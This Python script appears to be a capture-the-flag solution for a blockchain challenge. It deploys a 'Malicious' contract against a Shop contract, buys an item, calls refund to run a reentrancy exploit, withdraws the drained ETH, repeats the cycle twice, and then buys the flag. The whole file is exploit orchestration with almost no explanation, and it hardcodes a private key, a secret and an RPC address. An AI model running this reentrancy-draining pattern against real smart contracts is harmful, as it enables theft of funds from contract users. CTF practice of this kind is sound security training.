from web3 import Web3
from solcx import install_solc
from malicious import MaliciousContract
from shop import ShopContract

install_solc("0.6.0")



# Contract details
SHOP_ADDRESS = "0xA38f1339D5807d04c1C6beB4c3fa0437Aa937f67"
RPC = "http://64.23.154.146:48217"
PRIVATE_KEY = "0x63c3173c9b7a1e975202c1a386cd22610a28a8088828553fec51c93ae7bf3a1f"
WALLET_ADDRESS = "0x78367589e5Dd25f375369865E0B70D9D6BAB6306"
SECRET = "851c48a67005d02ccd81db0f33ffc7923cf6563979a5180bc902d2b894b9abd8"



def get_balance(walletAddress: str):
    web3 = Web3(Web3.HTTPProvider(RPC))
    # Get the balance
    balance_wei = web3.eth.get_balance(walletAddress)
    # Convert balance to Ether
    balance_eth = web3.from_wei(balance_wei, 'ether')

    return balance_eth

def print_balances(walletAddress, maliciousAddress, shopAddress):
    print(f'My balance                  => {get_balance(walletAddress)} ETH')
    print(f'Malicious Contract balance  => {get_balance(maliciousAddress)} ETH')
    print(f'Shop Contract balance       => {get_balance(shopAddress)} ETH')






if __name__ == '__main__':
    web3 = Web3(Web3.HTTPProvider(RPC))
    print(f'Balance: {get_balance(WALLET_ADDRESS)} ETH\n')

    Shop = ShopContract(WALLET_ADDRESS, PRIVATE_KEY, RPC)
    Malicious = MaliciousContract(WALLET_ADDRESS, PRIVATE_KEY, RPC)

    print("STEP 1: Deploying Malicious.sol...")

    Malicious.deploy(SHOP_ADDRESS)
    Shop.attach(SHOP_ADDRESS)

    print(f'Malicious contract deployed at: {Malicious.contractAddress}')
    print_balances(WALLET_ADDRESS, Malicious.contractAddress, Shop.contractAddress)
    print("\n\n\n")


    # We must do step this step 2 times cause for the first time 
    # we exploit the Reentrancy with only 4 ETH remaining, consuming all of our gas before the end
    for i in range(2):
        print(f"STEP {2+i+2}: Buy item 0 for 5 ether...")

        Malicious.buy(0, 1, web3.to_wei(5, 'ether'))

        print_balances(WALLET_ADDRESS, Malicious.contractAddress, Shop.contractAddress)
        print("\n\n\n")



        print(f"STEP {3+i+2}: Perform the Reentrancy exploit...")

        Malicious.refund()

        print_balances(WALLET_ADDRESS, Malicious.contractAddress, Shop.contractAddress)
        print("\n\n\n")



        print(f"STEP {4+i+2}: Withdraw ETH drained by our Malicious contract...")

        Malicious.withdraw()

        print_balances(WALLET_ADDRESS, Malicious.contractAddress, Shop.contractAddress)
        print("\n\n\n")



    print(f"STEP 8: Buy the flag...")

    Shop.buy(3, 1, web3.to_wei(1337, 'ether'))

    print_balances(WALLET_ADDRESS, Malicious.contractAddress, Shop.contractAddress)
    print("\n\n\n")


    # Check if the challenge is solved
    Shop.is_solved()
